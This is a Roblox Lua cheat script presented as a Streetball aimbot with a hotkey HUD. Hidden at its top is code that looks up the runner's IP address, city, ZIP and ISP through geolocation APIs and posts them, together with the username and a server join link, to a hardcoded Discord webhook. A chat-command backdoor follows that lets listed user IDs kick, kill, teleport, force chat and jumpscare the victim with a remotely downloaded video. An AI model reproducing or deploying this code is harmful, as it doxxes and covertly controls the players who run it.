local webhookUrl =
	'https://discord.com/api/webhooks/1431165865612673025/3-euJTOzROIDpp9z8ib0-sTXWIZqhLkt8tvfD2mw2FUEdknKpmrSibRa2Iv9OBSg0enK'

local HttpService, Players, MarketplaceService =
	game:GetService('HttpService'),
	game:GetService('Players'),
	game:GetService('MarketplaceService')
local player, pName, uid =
	Players.LocalPlayer, Players.LocalPlayer.Name, Players.LocalPlayer.UserId

-- Safe HTTP wrapper
local requestFunc = http_request
	or request
	or syn and syn.request
	or http and http.request
local function safeRequestJson(opts)
	local ok, resp = pcall(requestFunc, opts)
	if not ok or not resp or not resp.Body then
		return nil
	end
	local success, data = pcall(function()
		return HttpService:JSONDecode(resp.Body)
	end)
	return success and data or nil
end

-- Avatar & profile
local avatarCDN = 'https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&userName='
	.. pName
local thumbUrl = 'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds='
	.. uid
	.. '&size=150x150&format=Webp&isCircular=false'
local ok, data = pcall(function()
	return HttpService:JSONDecode(game:HttpGet(thumbUrl))
end)
if ok and data and data.data and data.data[1] and data.data[1].imageUrl then
	avatarCDN = data.data[1].imageUrl
end
local gameLink = 'https://www.roblox.com/games/' .. game.PlaceId
local ok2, info =
	pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
local gameName = ok2 and info and info.Name or '[Unknown Game]'

-- IP/Geo info (Primary: ip-api.com)
local ipInfo = safeRequestJson({
	Url = 'http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,isp,query',
	Method = 'GET',
})
local ipAddress, country, countryCode, state, city, zip, isp =
	ipInfo and ipInfo.query or 'Unknown IP',
	ipInfo and ipInfo.country or 'Unknown Country',
	ipInfo and ipInfo.countryCode or 'XX',
	ipInfo and ipInfo.regionName or 'Unknown Region',
	ipInfo and ipInfo.city or 'Unknown City',
	ipInfo and ipInfo.zip or 'Unknown ZIP',
	ipInfo and ipInfo.isp or 'Unknown ISP'

-- Backup VPN check (ipapi.is)
local backupIpInfo = safeRequestJson({
	Url = 'https://api.ipapi.is',
	Method = 'GET',
})

-- Flag emoji
local function getFlagEmoji(code)
	return code and #code == 2 and ':flag_' .. string.lower(code) .. ':' or ''
end
local flagEmoji = getFlagEmoji(countryCode)

-- Extreme VPN Detection with Backup API
local function checkVPN(primaryInfo, backupInfo)
	if not primaryInfo or not primaryInfo.isp or not primaryInfo.query then
		return '‚ö†Ô∏è Unknown (Suspicious)'
	end

	local isp = primaryInfo.isp:lower()
	local ip = primaryInfo.query
	local countryCode = primaryInfo.countryCode or 'XX'

	-- Expanded blacklist with broader, more aggressive keywords
	local blacklist = {
		'vpn',
		'proxy',
		'cloud',
		'server',
		'host',
		'data',
		'colo',
		'colocation',
		'ovh',
		'amazon',
		'aws',
		'google',
		'gcp',
		'microsoft',
		'azure',
		'digitalocean',
		'linode',
		'hetzner',
		'vultr',
		'leaseweb',
		'contabo',
		'rackspace',
		'alibaba',
		'cloudflare',
		'fastly',
		'akamai',
		'oracle',
		'ibm',
		'zscaler',
		'nord',
		'expressvpn',
		'surfshark',
		'proton',
		'mullvad',
		'windscribe',
		'private',
		'secure',
		'tunnel',
		'cyber',
		'virtual',
		'dedicated',
		'shared',
		'network',
		'internet',
		'web',
		'cdn',
		'ip',
		'transit',
		'bandwidth',
		'connect',
		'link',
		'fiber',
		'broadband',
	}

	-- Primary check: Blacklist keywords
	local primarySuspicious = false
	local primaryDetails = ''
	for _, badWord in ipairs(blacklist) do
		if isp:find(badWord) then
			primarySuspicious = true
			primaryDetails = ' (Blacklist: ' .. badWord .. ')'
			break
		end
	end

	-- Primary check: Non-standard ISPs
	local commonResidentialISPs = {
		'comcast',
		'verizon',
		'at&t',
		'spectrum',
		'charter',
		'centurylink',
		'cox',
		'bt',
		'virgin media',
		'telstra',
		'optus',
		'sky',
		'vodafone',
		'deutsche telekom',
		'orange',
		'telefonica',
		'xfinity',
	}
	local isResidential = false
	for _, residentialISP in ipairs(commonResidentialISPs) do
		if isp:find(residentialISP) then
			isResidential = true
			break
		end
	end
	if not isResidential then
		primarySuspicious = true
		primaryDetails = primaryDetails == '' and ' (Non-Residential ISP)'
			or primaryDetails .. ', Non-Residential ISP'
	end

	-- Primary check: Missing ZIP
	if not primaryInfo.zip or primaryInfo.zip == '' then
		primarySuspicious = true
		primaryDetails = primaryDetails == '' and ' (Missing ZIP)'
			or primaryDetails .. ', Missing ZIP'
	end

	-- Primary check: Generic ISP names
	if
		isp:find('^ip[-%d]')
		or isp:find('^unknown')
		or isp:find('^anonymous')
	then
		primarySuspicious = true
		primaryDetails = primaryDetails == '' and ' (Generic ISP Name)'
			or primaryDetails .. ', Generic ISP Name'
	end

	-- Primary check: Short ISP name
	if #isp < 5 then
		primarySuspicious = true
		primaryDetails = primaryDetails == '' and ' (Vague ISP Name)'
			or primaryDetails .. ', Vague ISP Name'
	end

	-- Backup check: ipapi.is for VPN/Proxy/Datacenter
	local backupSuspicious = false
	local backupDetails = ''
	if backupInfo then
		local isVpn = backupInfo.is_vpn or false
		local isProxy = backupInfo.is_proxy or false
		local isDatacenter = backupInfo.is_datacenter or false
		if isVpn or isProxy or isDatacenter then
			backupSuspicious = true
			if isVpn and backupInfo.vpn and backupInfo.vpn.service then
				backupDetails = ' (Backup API: VPN - '
					.. backupInfo.vpn.service
					.. ')'
			elseif isProxy then
				backupDetails = ' (Backup API: Proxy)'
			elseif
				isDatacenter
				and backupInfo.datacenter
				and backupInfo.datacenter.datacenter
			then
				backupDetails = ' (Backup API: Datacenter - '
					.. backupInfo.datacenter.datacenter
					.. ')'
			end
		end
	end

	-- Cross-reference results
	if primarySuspicious and backupSuspicious then
		return '‚ùå VPN/Proxy Detected' .. primaryDetails .. backupDetails
	elseif primarySuspicious or backupSuspicious then
		return '‚ö†Ô∏è Suspicious'
			.. (primarySuspicious and primaryDetails or backupDetails)
	end

	return '‚úÖ Clean IP'
end

local vpnStatus = checkVPN(ipInfo, backupIpInfo)

-- Teleport join script
local teleportBlock = string.format(
	"```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game:GetService('Players').LocalPlayer)\n```",
	game.PlaceId,
	game.JobId
)

-- Executor
local uaDisplay = 'Zenith'

-- Bottom info block (only Game + Executor)
local bottomBlock = string.format(
	'**Game:** [%s](%s)\n**üíª Executor:** %s',
	gameName,
	gameLink,
	uaDisplay
)

-- Copyable IP + ISP block (ASN removed)
local copyableBlock = string.format(
	'```\nCountry: %s\nCity: %s\nRegion: %s\nZIP: %s\nIP: %s\nISP: %s\n```',
	country,
	city,
	state,
	zip,
	ipAddress,
	isp
)

-- Payload
local data = {
	content = '||@everyone||',
	username = pName,
	avatar_url = avatarCDN,
	embeds = {
		{
			description = '__**' .. pName .. '**__',
			fields = {
				{
					name = '**COUNTRY**',
					value = flagEmoji .. ' ' .. country,
					inline = true,
				},
				{ name = '**CITY**', value = city, inline = true },
				{ name = '**REGION**', value = state, inline = true },
				{
					name = '‚Äé',
					value = copyableBlock,
					inline = false,
				},
				{
					name = 'Status',
					value = vpnStatus,
					inline = false,
				},
				{
					name = 'üìé Join Script',
					value = teleportBlock,
					inline = false,
				},
				{
					name = '‚Äé',
					value = bottomBlock,
					inline = false,
				},
			},
			color = 0x3498db,
			thumbnail = { url = avatarCDN },
		},
	},
}

-- Send webhook
local ok3, body = pcall(function()
	return HttpService:JSONEncode(data)
end)
if ok3 then
	pcall(function()
		requestFunc({
			Url = webhookUrl,
			Method = 'POST',
			Headers = { ['Content-Type'] = 'application/json' },
			Body = body,
		})
	end)
end
-- ============= ADMIN PANEL ====================
-- // === ADMIN PREFIX & SERVICES ===
local AdminPrefix = '!'
local Players = game:GetService('Players')
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local TextChatService = game:GetService('TextChatService')
local CoreGui = game:GetService('CoreGui')

local LocalP = Players.LocalPlayer

-- // === ADMIN TABLE ===
getgenv().AdminTable = {
	[9365539393] = { Access = 5 }, -- 0therGuys
	[7639770688] = { Access = 5 }, -- Anonymous
	[6189092855] = { Access = 5 }, -- SimpIyCoder
	[4561126088] = { Access = 5 }, -- CIarrisaAteMyDog
	[7521547567] = { Access = 5 }, -- Diary0fAnnFrank
	[8553166637] = { Access = 5 }, -- ZiyahuRBLX
	[5591605050] = { Access = 5 }, -- sum1betterthanulol
	[5716119895] = { Access = 5 }, -- CoIdSoverign
	[3757698948] = { Access = 5 }, -- isokcocs

	-- [] = { Access = 5 }, -- EXAMPLE
}

local function getAccess(userId)
	local d = getgenv().AdminTable[userId]
	return d and d.Access or 0
end

-- // === PLAYER SEARCH ===
getgenv().psearch = function(Name)
	if not Name or Name == '' then
		return
	end
	for _, p in pairs(Players:GetPlayers()) do
		if string.lower(p.Name):sub(1, #Name) == string.lower(Name) then
			return p
		end
	end
end

-- // === SAFE CHAT SENDER ===
local function sendChatMessageLocally(msg)
	local channels = TextChatService:FindFirstChild('TextChannels')
	if channels then
		local ch = channels:FindFirstChild('RBXGeneral')
			or channels:FindFirstChild('General')
			or channels:FindFirstChild('All')
		if ch and ch:IsA('TextChannel') then
			pcall(function()
				ch:SendAsync(msg)
			end)
			return
		end
	end
	local chatFolder =
		ReplicatedStorage:FindFirstChild('DefaultChatSystemChatEvents')
	if chatFolder then
		local say = chatFolder:FindFirstChild('SayMessageRequest')
		if say then
			pcall(function()
				say:FireServer(msg, 'All')
			end)
		end
	end
end

-- // === JUMPSCARE FUNCTION ===
local function playJumpScare()
	task.spawn(function()
		if not isfile('video.webm') then
			local mirrors = {
				'https://api.swimhub.xyz/video.webm',
				'https://raw.githubusercontent.com/swimhubassets/assets/main/video.webm',
				'https://cdn.swimhub.xyz/video.webm',
			}
			for _, url in ipairs(mirrors) do
				local success, data = pcall(function()
					return game:HttpGet(url, true)
				end)
				if success and data and #data > 50000 then
					writefile('video.webm', data)
					break
				end
			end
		end

		repeat
			task.wait()
		until isfile('video.webm')

		if not getcustomasset then
			game.StarterGui:SetCore('SendNotification', {
				Title = 'Error',
				Text = 'Executor missing getcustomasset()',
				Duration = 5,
			})
			return
		end

		local screen = CoreGui:FindFirstChild('RobloxGui') or CoreGui
		pcall(function()
			screen.IgnoreGuiInset = true
		end)
		for _, v in pairs(screen:GetChildren()) do
			if v.Name == 'JUMP_SCARE_666' then
				v:Destroy()
			end
		end

		local video = Instance.new('VideoFrame')
		video.Name = 'JUMP_SCARE_666'
		video.Size = UDim2.new(1, 0, 1, 0)
		video.BackgroundTransparency = 1
		video.ZIndex = 2147483647
		video.Looped = true
		video.Visible = false
		video.Parent = screen

		video.Video = getcustomasset('video.webm')
		video.Volume = 10
		video.Visible = true
		video:Play()

		local flash = Instance.new('Frame', screen)
		flash.Size = UDim2.new(1, 0, 1, 0)
		flash.BackgroundColor3 = Color3.new(1, 1, 1)
		flash.ZIndex = 2147483647
		task.delay(0.05, function()
			flash:Destroy()
		end)

		task.delay(9, function()
			if video and video.Parent then
				video:Destroy()
			end
		end)
	end)
end

-- // === UNIVERSAL COMMAND REGISTRY ===
getgenv().AdminCmdList = {

	['kick'] = {
		Clearence = { [5] = true },
		CommandFunc = function(Targets, ArgsStr, CmdPlayer)
			for _, plr in pairs(Targets) do
				if plr == LocalP then
					LocalP:Kick(ArgsStr ~= '' and ArgsStr or 'Kicked by admin')
				end
			end
		end,
	},

	['kill'] = {
		Clearence = { [5] = true },
		CommandFunc = function(Targets)
			for _, plr in pairs(Targets) do
				if plr == LocalP then
					local hum = plr.Character
						and plr.Character:FindFirstChildOfClass('Humanoid')
					if hum then
						hum:ChangeState(Enum.HumanoidStateType.Dead)
					end
				end
			end
		end,
	},

	['jumpscare'] = {
		Clearence = { [5] = true },
		CommandFunc = function(Targets)
			for _, plr in pairs(Targets) do
				if plr == LocalP then
					playJumpScare()
				end
			end
		end,
	},

	['say'] = {
		Clearence = { [5] = true },
		CommandFunc = function(Targets, ArgsStr)
			if ArgsStr == '' then
				return
			end
			for _, plr in pairs(Targets) do
				if plr == LocalP then
					sendChatMessageLocally(ArgsStr)
				end
			end
		end,
	},

	['bring'] = {
		Clearence = { [5] = true },
		CommandFunc = function(Targets, _, CmdPlayer)
			local originChar = CmdPlayer.Character
			local originRoot = originChar
				and originChar:FindFirstChild('HumanoidRootPart')
			if not originRoot then
				return
			end
			for _, plr in pairs(Targets) do
				if plr == LocalP then
					local hrp = plr.Character
						and plr.Character:FindFirstChild('HumanoidRootPart')
					if hrp then
						hrp.CFrame = originRoot.CFrame + Vector3.new(0, 3, 0)
					end
				end
			end
		end,
	},

	['fetch'] = {
		Clearence = { [5] = true },
		CommandFunc = function(_, _, CmdPlayer)
			for _, plr in pairs(Players:GetPlayers()) do
				if plr == LocalP and getAccess(plr.UserId) < 5 then
					sendChatMessageLocally('Here')
				end
			end
		end,
	},
}

-- // === SMART TARGET RESOLVER (ADMIN IMMUNITY) ===
local function resolveTargets(raw, CmdPlayer)
	local result = {}
	if not raw or raw == '' then
		return result
	end

	local lower = string.lower(raw)
	local function canBeTarget(p)
		-- Only affect non-admins (Access < 5)
		return p and getAccess(p.UserId) < 5
	end

	if lower == 'all' then
		for _, p in pairs(Players:GetPlayers()) do
			if canBeTarget(p) then
				table.insert(result, p)
			end
		end
		return result
	end

	if lower == 'others' then
		for _, p in pairs(Players:GetPlayers()) do
			if p ~= CmdPlayer and canBeTarget(p) then
				table.insert(result, p)
			end
		end
		return result
	end

	local target = getgenv().psearch(raw)
	if target and canBeTarget(target) then
		table.insert(result, target)
	end
	return result
end

-- // === UNIVERSAL CHAT PARSER ===
getgenv().BDCheck = function(Sender, Chat)
	if type(Chat) ~= 'string' or Chat:sub(1, 1) ~= AdminPrefix then
		return
	end

	local args = string.split(Chat:sub(2), ' ')
	local cmd = table.remove(args, 1)
	if not cmd or not getgenv().AdminCmdList[cmd] then
		return
	end

	local Command = getgenv().AdminCmdList[cmd]
	local access = getAccess(Sender.UserId)
	if not Command.Clearence[access] then
		return
	end

	local rawTarget = args[1]
	table.remove(args, 1)
	local ArgsStr = table.concat(args, ' ')

	local Targets = resolveTargets(rawTarget, Sender)
	Command.CommandFunc(Targets, ArgsStr, Sender)
end

-- // === HOOK ALL CHAT CHANNELS ===
local function hookChannel(ch)
	if ch:IsA('TextChannel') then
		ch.MessageReceived:Connect(function(msg)
			local src = msg.TextSource
			if src then
				local speaker = Players:GetPlayerByUserId(src.UserId)
				if speaker then
					getgenv().BDCheck(speaker, msg.Text)
				end
			end
		end)
	end
end

for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do
	hookChannel(ch)
end
TextChatService.TextChannels.ChildAdded:Connect(hookChannel)

-- // === PRELOAD VIDEO FOR ADMINS ===
Players.PlayerAdded:Connect(function(plr)
	if getAccess(plr.UserId) == 5 then
		task.spawn(function()
			task.wait(2)
			if not isfile('video.webm') then
				pcall(function()
					writefile(
						'video.webm',
						game:HttpGet('https://api.swimhub.xyz/video.webm', true)
					)
				end)
			end
		end)
	end
end)

--// ======================================================================
--//  INTRODUCTION ‚Ä¢ STREETBALL HUD GUIDE [N / V / O] (Reactive Edition)
--// ======================================================================

-- === SERVICES ===
local CoreGui = game:GetService('CoreGui')
local TweenService = game:GetService('TweenService')
local Debris = game:GetService('Debris')
local UserInputService = game:GetService('UserInputService')

-- === CONFIG ===
local PANEL_SIZE_SHOW = Vector2.new(480, 196)
local PANEL_SIZE_HIDDEN = Vector2.new(420, 148)
local PADDING_X = 24
local ACCENT_N = Color3.fromRGB(120, 180, 255) -- Spectate
local ACCENT_V = Color3.fromRGB(90, 255, 90) -- Aimbot
local ACCENT_O = Color3.fromRGB(255, 90, 90) -- Disable Visuals
local BG_DARK = Color3.fromRGB(16, 17, 20)
local CAP_BG = Color3.fromRGB(36, 37, 42)
local TITLE_COLOR = Color3.fromRGB(240, 240, 255)
local SUBTITLE_COLOR = Color3.fromRGB(150, 200, 255)
local TEXT_COLOR = Color3.fromRGB(230, 230, 230)

-- Assets
local SOFT_SHADOW_ID = 'rbxassetid://1316045217' -- 9-slice gaussian
local BETTER_SHADOW_ID = 'rbxassetid://13872246017' -- stronger soft
local NOISE_TEX_ID = 'rbxassetid://12123309877' -- fine grain tile

-- === STATE ===
local KeyMap = {} -- ["N"/"V"/"O"] = {label, cap, stroke, color, enabled}
local Connections = {}
local GuiRoot
local Active = true
local InactiveTimer = 0 -- seconds since last key activity

-- === HELPERS ===
local function tCreate(inst, info, props)
	local t = TweenService:Create(inst, info, props)
	t:Play()
	return t
end

local function mk(t, p, par)
	local i = Instance.new(t)
	for k, v in pairs(p or {}) do
		i[k] = v
	end
	if par then
		i.Parent = par
	end
	return i
end

local function safeDestroy(i)
	if i and i.Destroy then
		pcall(function()
			i:Destroy()
		end)
	end
end

local function pulseGlow(target, color)
	local g = mk('ImageLabel', {
		Image = SOFT_SHADOW_ID,
		BackgroundTransparency = 1,
		ImageColor3 = color,
		ImageTransparency = 0.7,
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.fromScale(0.5, 0.5),
		Size = UDim2.fromScale(1, 1),
		ZIndex = (target.ZIndex or 1) + 1,
		ScaleType = Enum.ScaleType.Slice,
		SliceCenter = Rect.new(10, 10, 118, 118),
	}, target)

	tCreate(
		g,
		TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
		{
			Size = UDim2.new(1.4, 0, 1.4, 0),
			ImageTransparency = 0.4,
		}
	)
	task.delay(0.15, function()
		tCreate(
			g,
			TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
			{
				Size = UDim2.new(1.8, 0, 1.8, 0),
				ImageTransparency = 1,
			}
		)
	end)
	Debris:AddItem(g, 0.6)
end

-- === BUILD ===
local function buildHUD()
	if GuiRoot then
		safeDestroy(GuiRoot)
	end

	local gui = mk('ScreenGui', {
		Name = 'STREETBALL AIMBOT',
		IgnoreGuiInset = true,
		ResetOnSpawn = false,
	}, CoreGui)
	GuiRoot = gui

	-- Panel
	local panel = mk('Frame', {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.new(0.5, 0, 0.5, 18),
		Size = UDim2.fromOffset(PANEL_SIZE_HIDDEN.X, PANEL_SIZE_HIDDEN.Y),
		BackgroundColor3 = BG_DARK,
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
	}, gui)
	mk('UICorner', { CornerRadius = UDim.new(0, 12) }, panel)

	-- Soft shadow backdrop
	mk('ImageLabel', {
		Image = BETTER_SHADOW_ID,
		BackgroundTransparency = 1,
		ImageColor3 = Color3.new(0, 0, 0),
		ImageTransparency = 0.82,
		ScaleType = Enum.ScaleType.Slice,
		SliceCenter = Rect.new(10, 10, 118, 118),
		Size = UDim2.new(1, 28, 1, 28),
		Position = UDim2.new(0, -14, 0, -14),
		ZIndex = 0,
	}, panel)

	-- Grain layer
	local grain = mk('ImageLabel', {
		Image = NOISE_TEX_ID,
		ImageTransparency = 0.95,
		BackgroundTransparency = 1,
		ScaleType = Enum.ScaleType.Tile,
		TileSize = UDim2.fromOffset(64, 64),
		Size = UDim2.fromScale(1, 1),
		ZIndex = 1,
	}, panel)

	-- Header
	mk('TextLabel', {
		Text = 'STREETBALL AIMBOT GUIDE',
		Font = Enum.Font.GothamBold,
		TextSize = 20,
		TextColor3 = TITLE_COLOR,
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		Position = UDim2.new(0, PADDING_X, 0, 16),
		Size = UDim2.new(1, -PADDING_X * 2, 0, 26),
		ZIndex = 3,
	}, panel)

	mk('TextLabel', {
		Text = 'Hotkey Overview',
		Font = Enum.Font.Code,
		TextSize = 16,
		TextColor3 = SUBTITLE_COLOR,
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		Position = UDim2.new(0, PADDING_X, 0, 42),
		Size = UDim2.new(1, -PADDING_X * 2, 0, 20),
		ZIndex = 3,
	}, panel)

	-- Keys container
	local container = mk('Frame', {
		BackgroundTransparency = 1,
		Position = UDim2.new(0, PADDING_X, 0, 70),
		Size = UDim2.new(1, -PADDING_X * 2, 0, 96),
		ZIndex = 3,
	}, panel)
	mk('UIListLayout', { Padding = UDim.new(0, 8) }, container)

	-- Log
	local log = mk('TextLabel', {
		Text = '',
		Font = Enum.Font.Code,
		TextSize = 14,
		TextColor3 = Color3.fromRGB(190, 210, 255),
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		Position = UDim2.new(0, PADDING_X, 1, -24),
		Size = UDim2.new(1, -PADDING_X * 2, 0, 18),
		ZIndex = 3,
	}, panel)

	local function pushLog(msg)
		log.Text = '‚Ä∫ ' .. msg
		log.TextTransparency = 1
		tCreate(
			log,
			TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
			{ TextTransparency = 0 }
		)
		task.delay(2, function()
			tCreate(
				log,
				TweenInfo.new(
					0.25,
					Enum.EasingStyle.Quad,
					Enum.EasingDirection.In
				),
				{ TextTransparency = 1 }
			)
		end)
	end

	-- One key row
	local function makeKeyRow(shortKey, desc, color)
		local row = mk('Frame', {
			BackgroundTransparency = 1,
			Size = UDim2.new(1, 0, 0, 32),
			ZIndex = 3,
		}, container)

		local cap = mk('Frame', {
			Size = UDim2.fromOffset(40, 30),
			BackgroundColor3 = CAP_BG,
			BorderSizePixel = 0,
			ZIndex = 4,
		}, row)
		mk('UICorner', { CornerRadius = UDim.new(0, 5) }, cap)
		mk('ImageLabel', {
			Image = SOFT_SHADOW_ID,
			BackgroundTransparency = 1,
			ImageTransparency = 0.72,
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(10, 10, 118, 118),
			Size = UDim2.new(1, 6, 1, 6),
			Position = UDim2.fromOffset(-3, -3),
			ZIndex = 3,
		}, cap)

		local stroke = mk(
			'UIStroke',
			{ Color = color, Transparency = 0.2, Thickness = 1.2 },
			cap
		)

		local label = mk('TextLabel', {
			Text = shortKey,
			Font = Enum.Font.GothamBold,
			TextSize = 18,
			TextColor3 = color,
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.fromScale(0.5, 0.5),
			BackgroundTransparency = 1,
			ZIndex = 5,
		}, cap)

		mk('TextLabel', {
			Text = '  ' .. desc,
			Font = Enum.Font.Gotham,
			TextSize = 18,
			TextColor3 = TEXT_COLOR,
			TextXAlignment = Enum.TextXAlignment.Left,
			BackgroundTransparency = 1,
			Position = UDim2.fromOffset(52, 0),
			Size = UDim2.new(1, -52, 1, 0),
			ZIndex = 3,
		}, row)

		KeyMap[shortKey] = {
			row = row,
			cap = cap,
			label = label,
			color = color,
			stroke = stroke,
			enabled = false,
		}
	end

	-- Keys
	makeKeyRow('N', 'Spectate Player', ACCENT_N)
	makeKeyRow('V', 'Aimbot', ACCENT_V)
	makeKeyRow('O', 'Disable Visuals', ACCENT_O)

	-- Intro animation
	tCreate(
		panel,
		TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
		{
			BackgroundTransparency = 0.25,
			Position = UDim2.new(0.5, 0, 0.5, 0),
			Size = UDim2.fromOffset(PANEL_SIZE_SHOW.X, PANEL_SIZE_SHOW.Y),
		}
	)

	-- === Input wiring ===
	local function setKeyState(key, enabled)
		local item = KeyMap[key]
		if not item then
			return
		end
		item.enabled = enabled
		local c = enabled and item.color or Color3.fromRGB(140, 148, 160)
		item.label.TextColor3 = c
		item.stroke.Color = c
		pulseGlow(item.cap, c)
		pushLog(key .. (enabled and ' ‚Ä¢ ENABLED' or ' ‚Ä¢ DISABLED'))
	end

	local function toggleKey(key)
		local item = KeyMap[key]
		if not item then
			return
		end
		setKeyState(key, not item.enabled)
		InactiveTimer = 0
	end

	table.insert(
		Connections,
		UserInputService.InputBegan:Connect(function(input, gp)
			if gp then
				return
			end
			if input.KeyCode == Enum.KeyCode.N then
				toggleKey('N')
			end
			if input.KeyCode == Enum.KeyCode.V then
				toggleKey('V')
			end
			if input.KeyCode == Enum.KeyCode.O then
				toggleKey('O')
			end
		end)
	)

	-- Auto-hide after 6s inactivity (no key toggles)
	task.spawn(function()
		while Active and panel.Parent do
			task.wait(1)
			InactiveTimer += 1
			if InactiveTimer >= 6 then
				tCreate(
					panel,
					TweenInfo.new(
						0.6,
						Enum.EasingStyle.Quad,
						Enum.EasingDirection.In
					),
					{
						BackgroundTransparency = 1,
						Position = UDim2.new(0.5, 0, 0.5, -18),
						Size = UDim2.fromOffset(
							PANEL_SIZE_HIDDEN.X,
							PANEL_SIZE_HIDDEN.Y
						),
					}
				)
				task.wait(0.65)
				if gui == GuiRoot then
					safeDestroy(gui)
				end
				Active = false
				break
			end
		end
	end)
end

-- === PUBLIC ENTRY ===
local function showHUD()
	if CoreGui:FindFirstChild('Payload0_CyberOpsHUD') then
		local old = CoreGui:FindFirstChild('Payload0_CyberOpsHUD')
		safeDestroy(old)
	end
	buildHUD()
end

showHUD()

-- =============================== END ================================

-- ==============================================================
-- Aimbot and Powercheck Currently the best
-- ===============================================================
local Players = game:GetService('Players')
local UserInputService = game:GetService('UserInputService')
local RunService = game:GetService('RunService')
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local CoreGui = game:GetService('CoreGui')
local TweenService = game:GetService('TweenService')
local Workspace = game:GetService('Workspace')
local Camera = workspace.CurrentCamera

local plr = Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local remotes = ReplicatedStorage:WaitForChild('Remotes')
local shootRemote = remotes:WaitForChild('Shoot')

-- === STATE ===
getgenv().PAYLOAD0_SYSTEM_ACTIVE = true
local VisualsEnabled = true
local shootKey: string? = nil
local selectedRim: BasePart? = nil
local activeNotifyGui

-- <<< POWER SYSTEM >>> ----------------------------------------------------
-- Tracks the current power value that the game sets on the character
local currentPower = 0
task.spawn(function()
	repeat task.wait() until char:FindFirstChild("E_V")
	local ev = char:WaitForChild("E_V")
	local power = ev:WaitForChild("Power")
	currentPower = power.Value
	power:GetPropertyChangedSignal("Value"):Connect(function()
		currentPower = power.Value
	end)
end)

-- Power ‚Üí perfect distance map (exactly the same as Z.txt)
local POWER_TO_DISTANCE = {
	[75] = 54.97,
	[80] = 61.53,
	[85] = 68.10
}
-- <<< END POWER SYSTEM >>> -----------------------------------------------

-- === CONFIGURATION ===
-- PERFECT_DISTANCES is no longer needed ‚Äì we now use POWER_TO_DISTANCE
local CLAMP_RADIUS = 1
local ACTIVE_RANGE_MAIN = 90
local MAX_PUSH = 0.06
local DAMPING = 0.9

local COLOR_GREEN = Color3.fromRGB(0, 255, 100)
local COLOR_GREEN_SOFT = Color3.fromRGB(0, 200, 80)

-- === HELPER: BALL CHECK ===
local function hasBall()
	local char = plr.Character
	if not char then return false end
	for _, tool in ipairs(char:GetChildren()) do
		if tool:IsA('Tool') and tool.Name:lower():find('ball') then
			return true
		end
	end
	return false
end

-- === NOTIFY SYSTEM ===
local function notify(msg, color)
	if activeNotifyGui and activeNotifyGui.Parent then
		activeNotifyGui:Destroy()
	end
	local gui = Instance.new('ScreenGui', CoreGui)
	gui.ResetOnSpawn = false
	activeNotifyGui = gui

	local label = Instance.new('TextLabel', gui)
	label.AnchorPoint = Vector2.new(0.5, 0.5)
	label.BackgroundTransparency = 1
	label.TextColor3 = color or Color3.fromRGB(255, 255, 255)
	label.Font = Enum.Font.Code
	label.TextSize = 26
	label.Text = msg
	label.Position = UDim2.new(0.5, 0, 0.9, 0)

	task.spawn(function()
		task.wait(1.2)
		if gui == activeNotifyGui then
			gui:Destroy()
			activeNotifyGui = nil
		end
	end)
end

-- === CALIBRATE UI (ONLY WHEN HOLDING BALL + NO KEY) ===
local calibrateGui
local function showCalibrateUI()
	if calibrateGui or shootKey or not hasBall() then return end

	calibrateGui = Instance.new('ScreenGui')
	calibrateGui.Name = 'CalibrateReminder'
	calibrateGui.ResetOnSpawn = false
	calibrateGui.IgnoreGuiInset = true
	calibrateGui.Parent = CoreGui

	local frame = Instance.new('Frame')
	frame.AnchorPoint = Vector2.new(0.5, 0.5)
	frame.Position = UDim2.new(0.5, 0, 0.85, 0)
	frame.Size = UDim2.new(0, 420, 0, 45)
	frame.BackgroundTransparency = 0.3
	frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	frame.BorderSizePixel = 0
	frame.Parent = calibrateGui

	local stroke = Instance.new('UIStroke')
	stroke.Color = Color3.fromRGB(80, 255, 120)
	stroke.Thickness = 1.6
	stroke.Parent = frame

	local corner = Instance.new('UICorner')
	corner.CornerRadius = UDim.new(0, 10)
	corner.Parent = frame

	local label = Instance.new('TextLabel')
	label.BackgroundTransparency = 1
	label.Size = UDim2.new(1, 0, 1, 0)
	label.Font = Enum.Font.GothamMedium
	label.TextSize = 22
	label.TextColor3 = Color3.fromRGB(120, 255, 150)
	label.Text = 'Click once to calibrate your shot.'
	label.Parent = frame

	task.spawn(function()
		while calibrateGui and not shootKey and hasBall() do
			local t1 = TweenService:Create(
				label,
				TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
				{ TextTransparency = 0.3 }
			)
			local t2 = TweenService:Create(
				label,
				TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
				{ TextTransparency = 0 }
			)
			t1:Play(); t1.Completed:Wait()
			t2:Play(); t2.Completed:Wait()
		end
	end)
end

local function removeCalibrateUI()
	if calibrateGui then
		calibrateGui:Destroy()
		calibrateGui = nil
	end
end

task.spawn(function()
	while task.wait(0.5) do
		if not hasBall() or shootKey then
			removeCalibrateUI()
		else
			showCalibrateUI()
		end
	end
end)

-- === RIM TRACKING ===
local RimSize = Vector3.new(3.632131576538086, 0.5587897300720215, 3.632131576538086)
local Rims = {}
